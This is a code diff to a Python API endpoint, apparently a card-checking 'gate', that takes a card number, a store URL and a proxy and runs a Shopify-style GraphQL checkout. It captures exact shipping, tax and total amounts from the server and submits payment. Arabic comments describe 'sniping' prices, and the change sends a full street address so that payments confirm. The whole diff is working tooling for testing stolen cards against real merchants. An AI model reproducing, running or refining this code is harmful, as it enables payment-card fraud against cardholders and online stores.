@@ -21,7 +21,7 @@ def format_proxy(proxy_str):
     elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
     return f"http://{proxy_str}"
 
-def safe_response(msg, raw_data, price, gate="Python Dynamic V19 (Sniper)"):
+def safe_response(msg, raw_data, price, gate="Python Dynamic V20"):
     raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '').replace('  ', '')[:400] if raw_data else "No Raw Data"
     final_msg = f"{msg} | RAW: {raw_clean}" if ("Failed" in msg or "Error" in msg or "Declined" in msg or "Rejected" in msg or "Empty" in msg or "Blocked" in msg) else msg
     clean_price = str(price).replace('$', '').strip() if price else "-"
@@ -138,7 +138,6 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             }
             merch_id = str(uuid.uuid4())
             
-            # 🔥 استعلام Proposal مخصص للقنص (بيستخرج الشحن والضريبة بدون أخطاء هيكلية)
             prop_query = """
             query Proposal($delivery: DeliveryTermsInput, $payment: PaymentTermInput, $merchandise: MerchandiseTermInput, $buyerIdentity: BuyerIdentityTermInput, $sessionInput: SessionTokenInput!) {
               session(sessionInput: $sessionInput) {
@@ -171,7 +170,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 "sessionInput": {"sessionToken": session_token},
                 "delivery": {
                     "deliveryLines": [{
-                        "destination": {"partialStreetAddress": partial_address},
+                        "destination": {"partialStreetAddress": partial_address}, # هنا نبعت جزئي للاستكشاف
                         "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}, "options": {}},
                         "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]},
                         "deliveryMethodTypes": ["SHIPPING"], "expectedTotalPrice": {"any": True}, "destinationChanged": False
@@ -203,7 +202,6 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
 
             seller_proposal = negotiate_res.get('sellerProposal', {})
             
-            # 🔥 قنص الأرقام الدقيقة من رد السيرفر
             exact_amount_constraint = {"any": True}
             currency = "USD"
             total_val = seller_proposal.get('total', {}).get('value')
@@ -236,7 +234,6 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                     if d_amt:
                         del_amt_constraint = {"value": {"amount": d_amt['amount'], "currencyCode": d_amt['currencyCode']}}
                 
-                # البحث في القائمة لو السعر مكنش مباشر
                 if del_amt_constraint.get("any"):
                     avail_strats = d_lines[0].get('availableDeliveryStrategies', [])
                     for strat in avail_strats:
@@ -276,21 +273,22 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                     "queueToken": queue_token,
                     "delivery": {
                         "deliveryLines": [{
-                            "destination": {"partialStreetAddress": partial_address},
+                            # 🔥 التحديث الجذري: نبعت العنوان الكامل (streetAddress) هنا عشان ناكد الدفع بدل العنوان الجزئي
+                            "destination": {"streetAddress": flat_address},
                             "targetMerchandiseLines": {"lines": target_lines},
                             "deliveryMethodTypes": ["SHIPPING"],
                             "destinationChanged": False,
                             "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": delivery_handle, "customDeliveryRate": False}, "options": {}},
-                            "expectedTotalPrice": del_amt_constraint # السعر المقنوص للشحن
+                            "expectedTotalPrice": del_amt_constraint
                         }],
                         "noDeliveryRequired": [],
                         "useProgressiveRates": False,
                         "supportsSplitShipping": True
                     },
                     "merchandise": {"merchandiseLines": submit_merch_lines},
-                    "taxes": {"proposedTotalAmount": tax_constraint}, # السعر المقنوص للضريبة
+                    "taxes": {"proposedTotalAmount": tax_constraint},
                     "payment": {
-                        "totalAmount": exact_amount_constraint, # السعر الإجمالي
+                        "totalAmount": exact_amount_constraint,
                         "paymentLines": [{
                             "paymentMethod": {
                                 "directPaymentMethod": {
